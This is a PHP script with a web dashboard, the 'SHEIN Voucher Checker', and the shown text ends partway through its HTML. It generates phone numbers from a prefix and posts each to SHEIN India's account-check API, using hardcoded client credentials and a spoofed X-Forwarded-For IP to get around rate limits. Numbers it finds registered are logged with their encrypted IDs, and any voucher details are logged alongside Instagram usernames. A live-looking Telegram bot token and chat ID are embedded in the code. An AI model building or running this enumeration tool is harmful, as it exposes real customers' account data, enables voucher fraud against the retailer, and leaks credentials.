<?php
// Telegram Bot Configuration - EDIT THESE
define('TELEGRAM_BOT_TOKEN', '8479991961:AAEWken8DazbjTaiN_DAGwTuY3Gq0-tb1Hc');
define('TELEGRAM_CHAT_ID', '1366899854');

// Global tracking to prevent duplicate numbers
$checkedNumbers = [];
$checkedNumbersFile = 'checked_numbers.json';

// New files for saving results
$registeredNumbersFile = 'registered_numbers.txt';
$voucherNumbersFile = 'voucher_numbers.txt';
$allResultsFile = 'all_results.json';

// Retry configuration
define('MAX_RETRIES', 3);
define('RETRY_DELAY', 1000000); // 1 second in microseconds

// Global retry queue
$retryQueue = [];

// ANSI color codes - Keep for display but will be stripped in web
define('COLOR_RESET', "\033[0m");
define('COLOR_RED', "\033[31m");
define('COLOR_GREEN', "\033[32m");
define('COLOR_YELLOW', "\033[33m");
define('COLOR_BLUE', "\033[34m");
define('COLOR_MAGENTA', "\033[35m");
define('COLOR_CYAN', "\033[36m");
define('COLOR_WHITE', "\033[37m");
define('COLOR_BOLD', "\033[1m");

// Detect environment
$isCli = (php_sapi_name() === 'cli');
$isWeb = !$isCli;

// Clear screen function (only works in CLI)
function clearScreen() {
    if (php_sapi_name() === 'cli') {
        echo "\033[2J\033[;H";
    }
}

// Load previously checked numbers
function loadCheckedNumbers() {
    global $checkedNumbers, $checkedNumbersFile;
    if (file_exists($checkedNumbersFile)) {
        $checkedNumbers = json_decode(file_get_contents($checkedNumbersFile), true) ?: [];
    }
}

// Save checked number
function saveCheckedNumber($number) {
    global $checkedNumbers, $checkedNumbersFile;
    $checkedNumbers[$number] = time();
    file_put_contents($checkedNumbersFile, json_encode($checkedNumbers, JSON_PRETTY_PRINT));
}

// Save registered number
function saveRegisteredNumber($number, $username = 'N/A', $encryptedId = 'N/A') {
    global $registeredNumbersFile;
    
    $timestamp = date('Y-m-d H:i:s');
    $entry = "[$timestamp] Number: $number | Instagram: $username | EncryptedID: $encryptedId\n";
    
    file_put_contents($registeredNumbersFile, $entry, FILE_APPEND | LOCK_EX);
    
    $jsonFile = 'registered_numbers.json';
    $registered = [];
    if (file_exists($jsonFile)) {
        $registered = json_decode(file_get_contents($jsonFile), true) ?: [];
    }
    $registered[$number] = [
        'number' => $number,
        'username' => $username,
        'encryptedId' => $encryptedId,
        'timestamp' => $timestamp
    ];
    file_put_contents($jsonFile, json_encode($registered, JSON_PRETTY_PRINT));
}

// Save voucher number
function saveVoucherNumber($number, $voucherData) {
    global $voucherNumbersFile, $allResultsFile;
    
    $timestamp = date('Y-m-d H:i:s');
    
    $entry = "[$timestamp] Number: $number | Instagram: {$voucherData['username']} | Voucher: {$voucherData['voucher']} | Amount: ₹{$voucherData['amount']} | Expiry: {$voucherData['expiry']} | Min Purchase: ₹{$voucherData['min_purchase']}\n";
    file_put_contents($voucherNumbersFile, $entry, FILE_APPEND | LOCK_EX);
    
    $jsonFile = 'voucher_numbers.json';
    $vouchers = [];
    if (file_exists($jsonFile)) {
        $vouchers = json_decode(file_get_contents($jsonFile), true) ?: [];
    }
    $vouchers[$number] = array_merge(
        ['timestamp' => $timestamp, 'number' => $number],
        $voucherData
    );
    file_put_contents($jsonFile, json_encode($vouchers, JSON_PRETTY_PRINT));
    
    $allResults = [];
    if (file_exists($allResultsFile)) {
        $allResults = json_decode(file_get_contents($allResultsFile), true) ?: [];
    }
    $allResults[] = array_merge(
        ['timestamp' => $timestamp, 'number' => $number, 'type' => 'voucher'],
        $voucherData
    );
    file_put_contents($allResultsFile, json_encode($allResults, JSON_PRETTY_PRINT));
}

// Save to retry queue - ONLY FOR REAL ERRORS
function saveToRetryQueue($number, $step, $headers, $retryCount = 0, $encryptedId = null, $errorReason = '') {
    global $retryQueue;
    
    $retryQueue[] = [
        'number' => $number,
        'step' => $step,
        'headers' => $headers,
        'retryCount' => $retryCount + 1,
        'lastAttempt' => time(),
        'encryptedId' => $encryptedId,
        'errorReason' => $errorReason
    ];
    
    // Save retry queue to file for persistence
    $retryFile = 'retry_queue.json';
    file_put_contents($retryFile, json_encode($retryQueue, JSON_PRETTY_PRINT));
    
    // Log the retry
    $logEntry = date('Y-m-d H:i:s') . " - QUEUED FOR RETRY {$retryCount}/" . MAX_RETRIES . " - Number: $number - Step: $step - Reason: $errorReason\n";
    file_put_contents('retry_log.txt', $logEntry, FILE_APPEND);
}

// Load retry queue from file
function loadRetryQueue() {
    global $retryQueue;
    $retryFile = 'retry_queue.json';
    if (file_exists($retryFile)) {
        $retryQueue = json_decode(file_get_contents($retryFile), true) ?: [];
    }
}

// Export to CSV
function exportToCSV() {
    $csvFile = 'voucher_results_' . date('Y-m-d') . '.csv';
    $jsonFile = 'voucher_numbers.json';
    
    if (file_exists($jsonFile)) {
        $vouchers = json_decode(file_get_contents($jsonFile), true) ?: [];
        
        $fp = fopen($csvFile, 'w');
        fputcsv($fp, ['Timestamp', 'Phone Number', 'Instagram Username', 'Voucher Code', 'Amount', 'Min Purchase', 'Expiry Date']);
        
        foreach ($vouchers as $voucher) {
            fputcsv($fp, [
                $voucher['timestamp'],
                $voucher['number'],
                $voucher['username'],
                $voucher['voucher'],
                $voucher['amount'],
                $voucher['min_purchase'],
                $voucher['expiry']
            ]);
        }
        fclose($fp);
        return $csvFile;
    }
    return false;
}

// Display saved stats
function displaySavedStats() {
    $stats = "\n" . COLOR_BOLD . COLOR_CYAN . "📁 SAVED RESULTS SUMMARY:\n" . COLOR_RESET;
    
    $registeredCount = 0;
    if (file_exists('registered_numbers.json')) {
        $registered = json_decode(file_get_contents('registered_numbers.json'), true) ?: [];
        $registeredCount = count($registered);
    }
    
    $voucherCount = 0;
    if (file_exists('voucher_numbers.json')) {
        $vouchers = json_decode(file_get_contents('voucher_numbers.json'), true) ?: [];
        $voucherCount = count($vouchers);
    }
    
    global $retryQueue;
    $retryCount = count($retryQueue);
    
    $stats .= COLOR_YELLOW . "📱 Registered numbers saved: " . COLOR_GREEN . $registeredCount . COLOR_RESET . "\n";
    $stats .= COLOR_YELLOW . "🎟 Voucher numbers saved: " . COLOR_GREEN . $voucherCount . COLOR_RESET . "\n";
    $stats .= COLOR_YELLOW . "🔄 Pending retries (real errors): " . COLOR_RED . $retryCount . COLOR_RESET . "\n";
    
    echo $stats;
}

// Send message to Telegram
function sendTelegramMessage($message) {
    if (TELEGRAM_BOT_TOKEN == 'YOUR_BOT_TOKEN' || TELEGRAM_CHAT_ID == 'YOUR_CHAT_ID') {
        return false;
    }
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 10
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// Generate complete phone number
function generateCompleteNumber($input) {
    $input = preg_replace('/[^0-9]/', '', $input);
    $inputLength = strlen($input);
    
    if ($inputLength >= 10) {
        return $input;
    }
    
    $digitsNeeded = 10 - $inputLength;
    $randomDigits = '';
    for ($i = 0; $i < $digitsNeeded; $i++) {
        $randomDigits .= rand(0, 9);
    }
    
    return $input . $randomDigits;
}

function httpCall($url, $data = null, $headers = [], $method = "GET", $returnHeaders = false) {
    $ch = curl_init();
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => $returnHeaders,
        CURLOPT_ENCODING => 'gzip',
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 15
    ]);
    
    if (strtoupper($method) === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    
    $output = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    return [
        'content' => $output, 
        'http_code' => $httpCode,
        'curl_error' => $curlError
    ];
}

function randIp() { 
    return rand(100,200) . "." . rand(10,250) . "." . rand(10,250) . "." . rand(1,250); 
}

function genDeviceId() { 
    return bin2hex(random_bytes(8)); 
}

// Check if response is a real error that needs retry
function isRealError($response) {
    // Connection error
    if (!empty($response['curl_error'])) {
        return true;
    }
    
    // Empty response
    if (empty($response['content'])) {
        return true;
    }
    
    $httpCode = $response['http_code'];
    
    // Server errors (5xx) - retry
    if ($httpCode >= 500 && $httpCode < 600) {
        return true;
    }
    
    // Rate limiting (429) - retry
    if ($httpCode == 429) {
        return true;
    }
    
    // Timeout (408) - retry
    if ($httpCode == 408) {
        return true;
    }
    
    // Bad gateway/gateway timeout - retry
    if ($httpCode == 502 || $httpCode == 503 || $httpCode == 504) {
        return true;
    }
    
    // Invalid JSON response
    if (!empty($response['content'])) {
        json_decode($response['content']);
        if (json_last_error() !== JSON_ERROR_NONE) {
            return true;
        }
    }
    
    return false;
}

// ============================================================================
// JOB QUEUE FUNCTIONS FOR WEB MODE
// ============================================================================

// Add a number to the processing queue
function addToQueue($baseNumber) {
    $queueFile = 'processing_queue.json';
    $queue = [];
    if (file_exists($queueFile)) {
        $queue = json_decode(file_get_contents($queueFile), true) ?: [];
    }
    
    // Generate initial batch of 100 numbers
    $numbers = [];
    for ($i = 0; $i < 100; $i++) {
        $numbers[] = generateCompleteNumber($baseNumber);
    }
    
    $queue[$baseNumber] = [
        'base' => $baseNumber,
        'numbers' => $numbers,
        'processed' => [],
        'status' => 'active',
        'started_at' => time(),
        'last_update' => time()
    ];
    
    file_put_contents($queueFile, json_encode($queue, JSON_PRETTY_PRINT));
    return true;
}

// Get queue status
function getQueueStatus() {
    $queueFile = 'processing_queue.json';
    if (!file_exists($queueFile)) {
        return null;
    }
    
    $queue = json_decode(file_get_contents($queueFile), true) ?: [];
    
    // Find active queue
    foreach ($queue as $base => $data) {
        if ($data['status'] == 'active') {
            return $data;
        }
    }
    
    return null;
}

// Update queue
function updateQueue($baseNumber, $processedNumber, $status) {
    $queueFile = 'processing_queue.json';
    if (!file_exists($queueFile)) {
        return false;
    }
    
    $queue = json_decode(file_get_contents($queueFile), true) ?: [];
    
    if (isset($queue[$baseNumber])) {
        // Remove from numbers list
        $key = array_search($processedNumber, $queue[$baseNumber]['numbers']);
        if ($key !== false) {
            unset($queue[$baseNumber]['numbers'][$key]);
            $queue[$baseNumber]['numbers'] = array_values($queue[$baseNumber]['numbers']);
        }
        
        // Add to processed
        $queue[$baseNumber]['processed'][] = [
            'number' => $processedNumber,
            'status' => $status,
            'time' => time()
        ];
        
        $queue[$baseNumber]['last_update'] = time();
        
        // If no more numbers, mark as completed
        if (empty($queue[$baseNumber]['numbers'])) {
            $queue[$baseNumber]['status'] = 'completed';
        }
        
        file_put_contents($queueFile, json_encode($queue, JSON_PRETTY_PRINT));
        return true;
    }
    
    return false;
}

// Add to sent log
function addToSentLog($number, $step, $ip, $data) {
    $logFile = 'sent_log.json';
    $log = [];
    if (file_exists($logFile)) {
        $log = json_decode(file_get_contents($logFile), true) ?: [];
    }
    
    $log[] = [
        'time' => date('H:i:s'),
        'number' => $number,
        'step' => $step,
        'ip' => $ip,
        'data' => $data
    ];
    
    // Keep only last 50
    if (count($log) > 50) {
        $log = array_slice($log, -50);
    }
    
    file_put_contents($logFile, json_encode($log, JSON_PRETTY_PRINT));
}

// Add to received log
function addToReceivedLog($number, $status, $voucherData = null, $retryCount = 0, $errorReason = '') {
    $logFile = 'received_log.json';
    $log = [];
    if (file_exists($logFile)) {
        $log = json_decode(file_get_contents($logFile), true) ?: [];
    }
    
    $entry = [
        'time' => date('H:i:s'),
        'number' => $number,
        'status' => $status,
        'retryCount' => $retryCount,
        'errorReason' => $errorReason
    ];
    
    if ($voucherData) {
        $entry['voucher'] = $voucherData['voucher'] ?? 'N/A';
        $entry['amount'] = $voucherData['amount'] ?? 'N/A';
        $entry['username'] = $voucherData['username'] ?? 'N/A';
        $entry['expiry'] = $voucherData['expiry'] ?? '';
    }
    
    $log[] = $entry;
    
    // Keep only last 50
    if (count($log) > 50) {
        $log = array_slice($log, -50);
    }
    
    file_put_contents($logFile, json_encode($log, JSON_PRETTY_PRINT));
}

// ============================================================================
// PROCESSOR FUNCTION - Run one step of the checker
// ============================================================================
function processOneNumber($access_token) {
    loadCheckedNumbers();
    loadRetryQueue();
    
    // First check retry queue
    global $retryQueue;
    if (!empty($retryQueue)) {
        $retry = array_shift($retryQueue);
        $ip = randIp();
        $adId = genDeviceId();
        
        addToSentLog($retry['number'], $retry['step'] . '_retry', $ip, "retry {$retry['retryCount']}/" . MAX_RETRIES);
        
        if ($retry['step'] == 'account_check') {
            $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
            $headers = [
                "Authorization: Bearer $access_token",
                "Requestid: account_check",
                "X-Tenant: B2C",
                "Accept: application/json",
                "User-Agent: Android",
                "Client_type: Android/29",
                "Client_version: 1.0.8",
                "X-Tenant-Id: SHEIN",
                "Ad_id: $adId",
                "Content-Type: application/x-www-form-urlencoded",
                "X-Forwarded-For: $ip"
            ];
            
            $response = httpCall($url, "mobileNumber={$retry['number']}", $headers, "POST");
            
            if (!isRealError($response) && isset(json_decode($response['content'], true)['encryptedId'])) {
                $j = json_decode($response['content'], true);
                saveRegisteredNumber($retry['number'], 'N/A', $j['encryptedId']);
                addToReceivedLog($retry['number'], 'registered');
                // Continue with token gen...
            } elseif (isRealError($response) && $retry['retryCount'] < MAX_RETRIES) {
                $retry['retryCount']++;
                $retry['lastAttempt'] = time();
                $retryQueue[] = $retry;
                addToReceivedLog($retry['number'], 'retry', null, $retry['retryCount'], 'Retrying');
            } else {
                saveCheckedNumber($retry['number']);
                addToReceivedLog($retry['number'], 'error', null, 0, 'Failed after retries');
            }
        }
        
        file_put_contents('retry_queue.json', json_encode($retryQueue, JSON_PRETTY_PRINT));
        return true;
    }
    
    // Check queue for new numbers
    $queue = getQueueStatus();
    if (!$queue || empty($queue['numbers'])) {
        return false;
    }
    
    $number = array_shift($queue['numbers']);
    
    // Check if already processed
    if (isset($checkedNumbers[$number])) {
        return true; // Skip, already checked
    }
    
    $ip = randIp();
    $adId = genDeviceId();
    
    addToSentLog($number, 'account_check', $ip, "mobile=$number");
    
    $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
    $headers = [
        "Authorization: Bearer $access_token",
        "Requestid: account_check",
        "X-Tenant: B2C",
        "Accept: application/json",
        "User-Agent: Android",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $response = httpCall($url, "mobileNumber=$number", $headers, "POST");
    
    if (isRealError($response)) {
        // Real error - add to retry queue
        $errorReason = !empty($response['curl_error']) ? $response['curl_error'] : "HTTP {$response['http_code']}";
        saveToRetryQueue($number, 'account_check', $headers, 0, null, $errorReason);
        addToReceivedLog($number, 'retry', null, 1, $errorReason);
        updateQueue($queue['base'], $number, 'retry');
        return true;
    }
    
    $j = json_decode($response['content'], true);
    
    if (isset($j['success']) && $j['success'] === false) {
        // NOT REGISTERED
        saveCheckedNumber($number);
        addToReceivedLog($number, 'not_registered');
        updateQueue($queue['base'], $number, 'not_registered');
    } elseif (isset($j['encryptedId'])) {
        // REGISTERED
        saveRegisteredNumber($number, 'N/A', $j['encryptedId']);
        addToReceivedLog($number, 'registered');
        updateQueue($queue['base'], $number, 'registered');
        
        // TODO: Continue with token gen and user data
        // This would be step 2 of the process
    } else {
        // Unexpected response
        saveCheckedNumber($number);
        addToReceivedLog($number, 'error', null, 0, 'Unexpected response');
        updateQueue($queue['base'], $number, 'error');
    }
    
    return true;
}

// ============================================================================
// WEB INTERFACE
// ============================================================================
if ($isWeb) {
    // Handle AJAX requests for the checker
    if (isset($_GET['ajax']) && $_GET['ajax'] == 'process') {
        header('Content-Type: application/json');
        
        // Get access token first
        $ip = randIp();
        $adId = genDeviceId();
        $url = "https://api.services.sheinindia.in/uaas/jwt/token/client";
        $headers = [
            "Client_type: Android/29",
            "Accept: application/json",
            "Client_version: 1.0.8",
            "User-Agent: Android",
            "X-Tenant-Id: SHEIN",
            "Ad_id: $adId",
            "X-Tenant: B2C",
            "Content-Type: application/x-www-form-urlencoded",
            "X-Forwarded-For: $ip"
        ];
        
        $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
        $response = httpCall($url, $data, $headers, "POST", 0);
        $j = json_decode($response['content'], true);
        $access_token = $j['access_token'] ?? null;
        
        if (!$access_token) {
            echo json_encode(['error' => 'Failed to get access token']);
            exit;
        }
        
        // Process one number
        $processed = processOneNumber($access_token);
        
        // Get updated stats
        $stats = [
            'total' => file_exists('checked_numbers.json') ? count(json_decode(file_get_contents('checked_numbers.json'), true) ?: []) : 0,
            'registered' => file_exists('registered_numbers.json') ? count(json_decode(file_get_contents('registered_numbers.json'), true) ?: []) : 0,
            'vouchers' => file_exists('voucher_numbers.json') ? count(json_decode(file_get_contents('voucher_numbers.json'), true) ?: []) : 0,
            'retries' => file_exists('retry_queue.json') ? count(json_decode(file_get_contents('retry_queue.json'), true) ?: []) : 0,
            'not_registered' => 0
        ];
        $stats['not_registered'] = $stats['total'] - $stats['registered'];
        
        // Get recent logs
        $sentLog = file_exists('sent_log.json') ? array_slice(json_decode(file_get_contents('sent_log.json'), true) ?: [], -15) : [];
        $receivedLog = file_exists('received_log.json') ? array_slice(json_decode(file_get_contents('received_log.json'), true) ?: [], -15) : [];
        $vouchers = file_exists('voucher_numbers.json') ? array_slice(array_reverse(json_decode(file_get_contents('voucher_numbers.json'), true) ?: []), 0, 5) : [];
        
        echo json_encode([
            'success' => true,
            'processed' => $processed,
            'stats' => $stats,
            'sent_log' => $sentLog,
            'received_log' => $receivedLog,
            'vouchers' => $vouchers
        ]);
        exit;
    }
    
    // Handle start command
    if (isset($_POST['base_number']) && !empty($_POST['base_number'])) {
        $baseNumber = preg_replace('/[^0-9]/', '', $_POST['base_number']);
        addToQueue($baseNumber);
        session_start();
        $_SESSION['base_number'] = $baseNumber;
        $_SESSION['checker_running'] = true;
        header('Location: ' . $_SERVER['PHP_SELF'] . '?running=1');
        exit;
    }
    
    // Handle stop command
    if (isset($_GET['stop'])) {
        session_start();
        $_SESSION['checker_running'] = false;
        $queueFile = 'processing_queue.json';
        if (file_exists($queueFile)) {
            $queue = json_decode(file_get_contents($queueFile), true) ?: [];
            foreach ($queue as $base => $data) {
                $queue[$base]['status'] = 'stopped';
            }
            file_put_contents($queueFile, json_encode($queue, JSON_PRETTY_PRINT));
        }
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    
    // Handle CSV export
    if (isset($_GET['export']) && $_GET['export'] == 'csv') {
        $csvFile = exportToCSV();
        if ($csvFile && file_exists($csvFile)) {
            header('Content-Type: text/csv');
            header('Content-Disposition: attachment; filename="' . basename($csvFile) . '"');
            readfile($csvFile);
            exit;
        }
    }
    
    session_start();
    $isRunning = isset($_SESSION['checker_running']) && $_SESSION['checker_running'] === true;
    $storedBaseNumber = $_SESSION['base_number'] ?? '';
    
    // Load initial stats
    $stats = [
        'total' => file_exists('checked_numbers.json') ? count(json_decode(file_get_contents('checked_numbers.json'), true) ?: []) : 0,
        'registered' => file_exists('registered_numbers.json') ? count(json_decode(file_get_contents('registered_numbers.json'), true) ?: []) : 0,
        'vouchers' => file_exists('voucher_numbers.json') ? count(json_decode(file_get_contents('voucher_numbers.json'), true) ?: []) : 0,
        'retries' => file_exists('retry_queue.json') ? count(json_decode(file_get_contents('retry_queue.json'), true) ?: []) : 0,
        'not_registered' => 0
    ];
    $stats['not_registered'] = $stats['total'] - $stats['registered'];
    
    $sentLog = file_exists('sent_log.json') ? array_slice(json_decode(file_get_contents('sent_log.json'), true) ?: [], -15) : [];
    $receivedLog = file_exists('received_log.json') ? array_slice(json_decode(file_get_contents('received_log.json'), true) ?: [], -15) : [];
    $vouchers = file_exists('voucher_numbers.json') ? array_slice(array_reverse(json_decode(file_get_contents('voucher_numbers.json'), true) ?: []), 0, 5) : [];
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SHEIN Voucher Checker</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
                color: #333;
            }
            .container { max-width: 1400px; margin: 0 auto; }
            .header {
                background: white;
                border-radius: 15px 15px 0 0;
                padding: 25px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.1);
                margin-bottom: 20px;
            }
            .header h1 { font-size: 28px; margin-bottom: 10px; color: #4a5568; }
            .header p { color: #718096; font-size: 16px; }
            
            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 20px;
            }
            .stat-card {
                background: white;
                padding: 20px;
                border-radius: 12px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
                transition: transform 0.3s;
            }
            .stat-card:hover { transform: translateY(-5px); }
            .stat-card .label {
                font-size: 14px;
                color: #718096;
                margin-bottom: 8px;
                text-transform: uppercase;
                letter-spacing: 1px;
            }
            .stat-card .value {
                font-size: 32px;
                font-weight: bold;
                color: #4a5568;
            }
            .stat-card.total { border-left: 4px solid #4299e1; }
            .stat-card.not-registered { border-left: 4px solid #f56565; }
            .stat-card.registered { border-left: 4px solid #9f7aea; }
            .stat-card.vouchers { border-left: 4px solid #48bb78; }
            .stat-card.retries { border-left: 4px solid #ecc94b; }
            
            .control-panel {
                background: white;
                border-radius: 12px;
                padding: 25px;
                margin-bottom: 20px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            }
            .input-group {
                display: flex;
                gap: 15px;
                flex-wrap: wrap;
            }
            .input-group input {
                flex: 1;
                min-width: 250px;
                padding: 12px 15px;
                border: 2px solid #e2e8f0;
                border-radius: 8px;
                font-size: 16px;
                transition: border-color 0.3s;
            }
            .input-group input:focus {
                outline: none;
                border-color: #667eea;
            }
            .btn {
                padding: 12px 30px;
                border: none;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s;
                text-decoration: none;
                display: inline-block;
            }
            .btn-primary {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
            }
            .btn-primary:hover {
                transform: translateY(-2px);
                box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
            }
            .btn-danger {
                background: #f56565;
                color: white;
            }
            .btn-danger:hover {
                background: #e53e3e;
                transform: translateY(-2px);
            }
            .btn-success {
                background: #48bb78;
                color: white;
            }
            .btn-success:hover {
                background: #38a169;
                transform: translateY(-2px);
            }
            
            .tables-container {
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 20px;
                margin-bottom: 20px;
            }
            .table-wrapper {
                background: white;
                border-radius: 12px;
                overflow: hidden;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            }
            .table-header {
                background: #f7fafc;
                padding: 15px 20px;
                border-bottom: 2px solid #e2e8f0;
            }
            .table-header h3 { color: #4a5568; font-size: 18px; }
            .table-scroll {
                max-height: 400px;
                overflow-y: auto;
            }
            table {
                width: 100%;
                border-collapse: collapse;
            }
            th {
                background: #edf2f7;
                padding: 12px;
                text-align: left;
                font-size: 12px;
                text-transform: uppercase;
                color: #718096;
                position: sticky;
                top: 0;
                z-index: 10;
            }
            td {
                padding: 12px;
                border-bottom: 1px solid #e2e8f0;
                font-size: 14px;
            }
            .status-success { color: #48bb78; font-weight: 600; }
            .status-error { color: #f56565; font-weight: 600; }
            .status-warning { color: #ecc94b; font-weight: 600; }
            .status-info { color: #4299e1; font-weight: 600; }
            
            .vouchers-section {
                background: white;
                border-radius: 12px;
                padding: 20px;
                margin-bottom: 20px;
                box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            }
            .voucher-item {
                display: flex;
                align-items: center;
                padding: 15px;
                border-bottom: 1px solid #e2e8f0;
            }
            .voucher-item:last-child { border-bottom: none; }
            .voucher-badge {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 8px 15px;
                border-radius: 20px;
                font-size: 14px;
                font-weight: 600;
                margin-right: 15px;
            }
            .voucher-details { flex: 1; }
            .voucher-details strong { color: #4a5568; font-size: 16px; }
            .voucher-details .meta {
                color: #718096;
                font-size: 13px;
                margin-top: 4px;
            }
            .voucher-code {
                background: #edf2f7;
                padding: 5px 10px;
                border-radius: 5px;
                font-family: monospace;
                font-size: 14px;
                color: #4a5568;
            }
            
            .alert {
                padding: 15px 20px;
                border-radius: 8px;
                margin-bottom: 20px;
            }
            .alert-info {
                background: #ebf8ff;
                border-left: 4px solid #4299e1;
                color: #2b6cb0;
            }
            
            .status-text {
                display: inline-block;
                padding: 2px 8px;
                border-radius: 4px;
                font-size: 12px;
                font-weight: 600;
            }
            .status-text.success { background: #c6f6d5; color: #22543d; }
            .status-text.error { background: #fed7d7; color: #742a2a; }
            .status-text.warning { background: #feebc8; color: #744210; }
            .status-text.info { background: #bee3f8; color: #1e4a6b; }
            
            .loading {
                display: inline-block;
                width: 20px;
                height: 20px;
                border: 3px solid #f3f3f3;
                border-top: 3px solid #667eea;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin-right: 10px;
            }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            
            @media (max-width: 768px) {
                .tables-container { grid-template-columns: 1fr; }
                .input-group { flex-direction: column; }
                .btn { width: 100%; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🔍 SHEIN Voucher Checker</h1>
                <p>Automated phone number checker with IP rotation and retry logic for REAL errors only</p>
            </div>
            
            <?php if ($isRunning): ?>
            <div class="alert alert-info" id="runningAlert">
                <div style="display: flex; align-items: center;">
                    <span class="loading"></span>
                    <strong>Checker is running</strong> for base number: <?php echo htmlspecialchars($storedBaseNumber); ?>
                    <span style="margin-left: 10px;">Processing numbers...</span>
                </div>
                <div style="margin-top: 15px;">
                    <a href="?stop=1" class="btn btn-danger" style="font-size: 14px; padding: 8px 20px;">🛑 Stop Checker</a>
                    <a href="?export=csv" class="btn btn-success" style="font-size: 14px; padding: 8px 20px; margin-left: 10px;">📥 Export CSV</a>
                </div>
            </div>
            <?php endif; ?>
            
            <div class="stats-grid" id="statsGrid">
                <div class="stat-card total">
                    <div class="label">Total Processed</div>
                    <div class="value" id="stat-total"><?php echo number_format($stats['total']); ?></div>
                </div>
                <div class="stat-card not-registered">
                    <div class="label">Not Registered</div>
                    <div class="value" id="stat-not-registered"><?php echo number_format($stats['not_registered']); ?></div>
                </div>
                <div class="stat-card registered">
                    <div class="label">Registered</div>
                    <div class="value" id="stat-registered"><?php echo number_format($stats['registered']); ?></div>
                </div>
                <div class="stat-card vouchers">
                    <div class="label">Vouchers Found</div>
                    <div class="value" id="stat-vouchers"><?php echo number_format($stats['vouchers']); ?></div>
                </div>
                <div class="stat-card retries">
                    <div class="label">Pending Retries</div>
                    <div class="value" id="stat-retries"><?php echo number_format($stats['retries']); ?></div>
                </div>
            </div>
            
            <div class="control-panel">
                <?php if (!$isRunning): ?>
                <form method="POST" class="input-group" id="startForm">
                    <input type="text" name="base_number" placeholder="Enter base number (e.g., 98, 987, 98765)" required 
                           value="<?php echo htmlspecialchars($storedBaseNumber); ?>">
                    <button type="submit" class="btn btn-primary" id="startBtn">▶ Start Checker</button>
                </form>
                <?php else: ?>
                <div class="input-group">
                    <input type="text" value="Checker running for: <?php echo htmlspecialchars($storedBaseNumber); ?>" disabled>
                    <a href="?stop=1" class="btn btn-danger" id="stopBtn">🛑 Stop Checker</a>
                </div>
                <?php endif; ?>
                
                <p style="margin-top: 15px; color: #718096; font-size: 13px;">
                    <strong>Features:</strong> IP rotation per request | 200ms delay | Only REAL errors retried (timeouts, 5xx, empty responses)
                </p>
            </div>
            
            <div class="tables-container">
                <!-- Sent Requests -->
                <div class="table-wrapper">
                    <div class="table-header">
                        <h3>📤 Sent Requests (Last 15)</h3>
                    </div>
                    <div class="table-scroll">
                        <table id="sentTable">
                            <thead>
                                <tr><th>Time</th><th>Number</th><th>Step</th><th>IP</th><th>Data</th></tr>
                            </thead>
                            <tbody>
                                <?php foreach ($sentLog as $entry): ?>
                                <tr>
                                    <td><?php echo htmlspecialchars($entry['time'] ?? ''); ?></td>
                                    <td><strong><?php echo htmlspecialchars($entry['number'] ?? ''); ?></strong></td>
                                    <td><span class="status-text info"><?php echo htmlspecialchars($entry['step'] ?? ''); ?></span></td>
                                    <td><?php echo htmlspecialchars($entry['ip'] ?? ''); ?></td>
                                    <td><?php echo htmlspecialchars($entry['data'] ?? ''); ?></td>
                                </tr>
                                <?php endforeach; ?>
                                <?php if (empty($sentLog)): ?>
                                <tr><td colspan="5" style="text-align: center;">No data yet</td></tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
                
                <!-- Received Responses -->
                <div class="table-wrapper">
                    <div class="table-header">
                        <h3>📥 Received Responses (Last 15)</h3>
